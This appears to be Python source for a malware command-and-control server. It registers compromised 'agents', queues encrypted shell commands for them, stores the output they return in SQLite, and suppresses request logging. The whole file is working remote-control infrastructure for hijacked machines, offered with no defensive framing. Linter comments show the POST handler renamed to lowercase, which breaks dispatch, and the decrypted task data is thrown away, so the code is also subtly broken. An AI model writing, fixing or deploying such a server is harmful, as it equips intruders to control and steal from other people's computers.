import base64
import json
import sqlite3
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

from .crypto import decrypt_message, encrypt_message
from .shared_key import SHARED_KEY


class C2Handler(BaseHTTPRequestHandler):
    def do_post(self):  # N802: lowercase
        if self.path == "/register":
            try:
                content_length = int(self.headers["Content-Length"])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data)

                agent_id = data.get("agent_id")
                hostname = data.get("hostname")
                os_info = data.get("os")

                conn = sqlite3.connect("c2.db")
                c = conn.cursor()
                c.execute("""CREATE TABLE IF NOT EXISTS agents
                             (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, last_seen INTEGER)""")
                c.execute(
                    """INSERT OR REPLACE INTO agents (id, hostname, os, last_seen)
                             VALUES (?, ?, ?, ?)""",
                    (agent_id, hostname, os_info, int(time.time())),
                )
                conn.commit()
                conn.close()

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "registered"}).encode())
            except Exception as e:
                print(f"[-] Register error: {e}")
                self.send_response(500)
                self.end_headers()

        elif self.path == "/task":
            try:
                content_length = int(self.headers["Content-Length"])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data)
                agent_id = data.get("agent_id")

                ciphertext_b64 = data.get("data", "")
                if not ciphertext_b64:
                    self.send_response(400)
                    self.end_headers()
                    return

                ciphertext = base64.b64decode(ciphertext_b64)
                decrypt_message(ciphertext)  # F841: removed unused variable

                conn = sqlite3.connect("c2.db")
                c = conn.cursor()
                c.execute("""CREATE TABLE IF NOT EXISTS tasks
                             (id INTEGER PRIMARY KEY AUTOINCREMENT,
                              agent_id TEXT, command TEXT, status TEXT)""")
                c.execute(
                    """SELECT command FROM tasks
                             WHERE agent_id = ? AND status = 'pending' LIMIT 1""",
                    (agent_id,),
                )
                row = c.fetchone()

                if row:
                    c.execute(
                        """UPDATE tasks SET status = 'assigned'
                                 WHERE agent_id = ? AND command = ?""",
                        (agent_id, row[0]),
                    )
                    conn.commit()
                    conn.close()

                    response = {"command": row[0]}
                    encrypted_response = encrypt_message(json.dumps(response))
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"data": base64.b64encode(encrypted_response).decode()}).encode())
                else:
                    conn.close()
                    response = {"command": None}
                    encrypted_response = encrypt_message(json.dumps(response))
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"data": base64.b64encode(encrypted_response).decode()}).encode())
            except Exception as e:
                print(f"[-] Task error: {e}")
                self.send_response(500)
                self.end_headers()

        elif self.path == "/result":
            try:
                content_length = int(self.headers["Content-Length"])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data)
                agent_id = data.get("agent_id")
                command = data.get("command")
                output = data.get("output")

                conn = sqlite3.connect("c2.db")
                c = conn.cursor()
                c.execute("""CREATE TABLE IF NOT EXISTS results
                             (id INTEGER PRIMARY KEY AUTOINCREMENT,
                              agent_id TEXT, command TEXT, output TEXT, timestamp INTEGER)""")
                c.execute(
                    """INSERT INTO results (agent_id, command, output, timestamp)
                             VALUES (?, ?, ?, ?)""",
                    (agent_id, command, output, int(time.time())),
                )
                conn.commit()
                conn.close()

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "recorded"}).encode())
            except Exception as e:
                print(f"[-] Result error: {e}")
                self.send_response(500)
                self.end_headers()

    def log_message(self, _format, *args):  # A002: renamed format to _format
        pass


def run_server(port=8000):
    server_addr = ("0.0.0.0", port)  # B104: extracted to variable
    server = HTTPServer(server_addr, C2Handler)
    print(f"[+] C2 server running on port {port}")
    print("[+] Using AES-256-GCM encryption")
    print(f"[+] Shared key: {SHARED_KEY.hex()[:16]}...")
    server.serve_forever()
